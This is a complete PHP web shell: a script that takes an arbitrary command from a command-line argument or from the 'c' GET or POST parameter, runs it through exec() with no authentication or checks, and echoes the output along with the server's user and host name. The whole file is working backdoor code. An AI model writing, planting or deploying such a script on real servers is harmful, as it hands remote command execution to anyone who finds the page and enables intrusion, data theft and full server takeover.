<?php
if('cli' == php_sapi_name()){
    if($argc != 2){
        die("Wrong number ot arguments: I expect a argument as the shell command to be execute. Note: Just a argument.");
    }
    $shell_cmd = $argv[1];
} else {
    if(isset($_GET['c']) && (null != $_GET['c'])){
        $shell_cmd = $_GET['c'];
    } else if(isset($_POST['c']) && (null != $_POST['c'])){
        $shell_cmd = $_POST['c'];
    } else {
        die('I have not get any argument as the shell command to be execute; I can accept cli, get, post arguments.');
    }
}

//$shell_cmd = 'id `whoami`';
//$shell_cmd = 'ls -al';


echo date('r').'<br>';
echo '['.exec('whoami').'@'.$_SERVER["SERVER_NAME"].'] '.$shell_cmd.'<br>';
exec($shell_cmd." 2>&1", $id_info);
if(!$id_info) exit('Get array failed.');
foreach ( $id_info as $key => $value ) {
    echo $key.': '.$value.'<br>';
}
